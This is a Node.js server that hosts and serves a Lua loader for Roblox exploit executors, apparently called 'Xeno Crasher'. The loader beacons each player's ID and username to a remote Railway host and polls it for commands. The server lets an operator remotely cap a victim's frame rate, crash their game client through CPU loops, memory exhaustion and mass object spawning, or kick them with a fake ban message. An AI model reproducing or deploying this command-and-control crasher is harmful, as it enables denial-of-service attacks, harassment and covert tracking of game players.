const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Api-Key']
}));
app.use(express.json({ limit: '10mb' }));

const players = new Map();

// ============================================
// LOADER SCRIPT
// ============================================
app.get('/loader.lua', (req, res) => {
    const loader = `--[[ Xeno Crasher - MULTI-USE ]]--
local BASE = "${PUBLIC_URL}"
local KEY = "xenooooo"

local HttpService = game:GetService("HttpService")
HttpService.HttpEnabled = true

local function sendRequest(method, url, data)
    local options = {
        Url = url,
        Method = method,
        Headers = {
            ["Content-Type"] = "application/json",
            ["X-Api-Key"] = KEY
        }
    }
    if method == "POST" and data then
        options.Body = data
    end
    
    local success, result = pcall(function()
        if syn and syn.request then
            return syn.request(options)
        elseif request then
            return request(options)
        elseif http and http.request then
            return http.request(options)
        elseif fluxus and fluxus.request then
            return fluxus.request(options)
        elseif http_request then
            return http_request(options)
        else
            return HttpService:RequestAsync(options)
        end
    end)
    
    if success and result then
        if type(result) == "table" and result.Body then
            return result.Body
        elseif type(result) == "string" then
            return result
        end
    end
    return nil
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function heartbeat()
    local data = HttpService:JSONEncode({
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        executor = "XenoClient",
        online = true
    })
    sendRequest("POST", BASE .. "/api/public/heartbeat", data)
end

local fpsConnection = nil
local fpsActive = false

local function setFPSLimit(targetFPS)
    if fpsConnection then
        fpsConnection:Disconnect()
        fpsConnection = nil
        fpsActive = false
    end
    if not targetFPS or targetFPS <= 0 then
        return
    end
    fpsActive = true
    local frameTime = 1 / targetFPS
    fpsConnection = RunService.RenderStepped:Connect(function()
        local startTime = tick()
        while tick() - startTime < frameTime and fpsActive do end
    end)
end

local function crashGame()
    task.spawn(function()
        while true do
            local x = 0
            for i = 1, 1000000 do x = x + i end
        end
    end)
    task.spawn(function()
        local t = {}
        while true do
            for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
            task.wait()
        end
    end)
    task.spawn(function()
        for i = 1, 5000 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(100, 100, 100)
            p.Parent = workspace
            p.Position = Vector3.new(
                math.random(-1000, 1000),
                math.random(-1000, 1000),
                math.random(-1000, 1000)
            )
            task.wait(0.01)
        end
    end)
end

local pollRunning = false
local function poll()
    if pollRunning then return end
    pollRunning = true
    
    local url = BASE .. "/api/public/command?user_id=" .. LP.UserId
    local result = sendRequest("GET", url, nil)
    
    if result and result ~= "" then
        local success, data = pcall(function()
            return HttpService:JSONDecode(result)
        end)
        
        if success and data then
            if data.fps_limit then
                setFPSLimit(tonumber(data.fps_limit))
            else
                setFPSLimit(nil)
            end
            
            if data.crash == true then
                crashGame()
            end
            
            if data.kick == true then
                local kickMessage = data.kick_message or "You have been banned."
                task.wait(0.5)
                LP:Kick(kickMessage)
            end
        end
    end
    
    pollRunning = false
end

heartbeat()
task.wait(3)

task.spawn(function()
    while true do
        poll()
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        heartbeat()
        task.wait(5)
    end
end)`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ============================================
// ✅ API ENDPOINTS - FIXED MULTI-USE
// ============================================

// GET Heartbeat (for mobile/executors that block POST)
app.get('/api/public/heartbeat', (req, res) => {
    const { user_id, username, display_name, executor, online } = req.query;
    if (!user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(user_id);
    
    // Always create/update player, even if they were previously kicked
    const existing = players.get(userId) || {};
    players.set(userId, {
        user_id: userId,
        username: username || existing.username || 'Unknown',
        display_name: display_name || existing.display_name || '',
        executor: executor || existing.executor || 'Unknown',
        online: true,
        lastHeartbeat: Date.now(),
        _crash: false,
        _kick: false,
        _kick_message: '',
        fps_limit: false
    });
    
    res.json({ status: 'ok' });
});

// POST Heartbeat
app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    
    // Always create/update player, even if they were previously kicked
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        _crash: false,
        _kick: false,
        _kick_message: '',
        fps_limit: false
    });
    
    res.json({ status: 'ok' });
});

// Get all players
app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

// Send command to player
app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, kick, kick_message, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    
    if (fps_limit !== undefined) {
        p.fps_limit = parseInt(fps_limit) || false;
        console.log(`🎯 FPS set to ${p.fps_limit} for: ${p.username || userId}`);
    }
    if (kick === true) {
        p._kick = true;
        p._kick_message = kick_message || "You have been banned.";
        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
    }
    if (crash === true) {
        p._crash = true;
        console.log(`💥 CRASH SENT TO: ${p.username || userId}`);
    }
    
    players.set(userId, p);
    res.json({ status: 'ok' });
});

// Player polls for commands
app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const p = players.get(String(userId));
    if (!p) {
        return res.json({});
    }
    
    const response = {};
    
    if (p.fps_limit) {
        response.fps_limit = p.fps_limit;
        p.fps_limit = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
        console.log(`💥 CRASH DELIVERED TO: ${p.username || userId}`);
    }
    if (p._kick) {
        response.kick = true;
        response.kick_message = p._kick_message || "You have been banned.";
        p._kick = false;
        p._kick_message = '';
        // Don't remove player - they can rejoin and get kicked again
        console.log(`👢 KICK DELIVERED TO: ${p.username || userId}`);
    }
    
    players.set(String(userId), p);
    res.json(response);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${PUBLIC_URL}`);
});
